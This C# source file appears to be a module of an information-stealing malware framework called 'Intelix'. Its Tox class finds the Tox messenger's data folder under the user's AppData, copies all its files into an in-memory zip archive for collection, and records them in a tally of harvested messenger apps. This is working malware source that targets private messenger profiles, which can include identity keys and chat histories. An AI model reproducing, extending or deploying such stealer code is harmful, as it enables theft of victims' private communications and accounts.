using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers;

public class Tox : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Tox");
		if (Directory.Exists(text))
		{
			string text2 = "Tox";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Tox";
			zip.AddDirectoryFiles(text, text2);
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Messangers.Add(counterApplications);
		}
	}
}
